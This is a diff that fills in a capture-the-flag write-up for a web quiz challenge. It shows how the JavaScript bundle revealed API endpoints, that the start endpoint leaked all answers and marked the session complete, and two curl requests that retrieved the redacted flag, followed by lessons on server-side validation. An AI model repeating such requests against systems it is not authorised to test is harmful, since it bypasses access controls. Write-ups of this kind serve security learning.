@@ -23,10 +23,68 @@ Submit your findings in the format: HTB{redacted}. Example: HTB{redacted}
  IP:154.57.164.82:30881
 
 ## Approach
-(fill in as you work)
+
+The web application was served at `http://154.57.164.82:30881`. Inspecting its
+JavaScript bundle revealed the challenge API endpoints:
+
+- `POST /api/start-challenge`
+- `POST /api/submit-answer`
+- `POST /api/get-flag`
+
+Starting a challenge returned a session ID, but the JSON response also exposed
+the complete answer list and marked every answer as correct:
+
+```json
+{
+  "answers": [
+    "Bushmaster",
+    "Thales Australia",
+    "1997",
+    "Australia",
+    "9 passengers and 1 driver"
+  ],
+  "correct": [true, true, true, true, true],
+  "correct_answers": 5,
+  "session_id": "<session_id>"
+}
+```
+
+This is an information-disclosure and challenge-state initialization flaw: the
+server sent the expected answers to the client and treated the new session as
+already complete. Consequently, no individual answers needed to be submitted.
+
+I preserved the session cookie and sent the returned session ID directly to the
+flag endpoint:
+
+```bash
+curl -sS -c cookies.txt -b cookies.txt \
+  -X POST -H 'Content-Type: application/json' \
+  http://154.57.164.82:30881/api/start-challenge
+
+curl -sS -c cookies.txt -b cookies.txt \
+  -X POST -H 'Content-Type: application/json' \
+  --data '{"session_id":"<session_id>"}' \
+  http://154.57.164.82:30881/api/get-flag
+```
+
+The second request returned:
+
+```json
+{"flag":"HTB{redacted}"}
+```
 
 ## Tools
 
+- `curl` for interacting with the application and API
+- Browser JavaScript bundle inspection to identify API endpoints
+
 ## Lessons
 
+- Never include correct answers or other sensitive server-side state in a
+  client-facing API response.
+- Completion state must be initialized and validated on the server.
+- Flag authorization should verify submitted answers independently instead of
+  trusting client-visible or incorrectly initialized session state.
+
 ## Flag
+HTB{redacted}
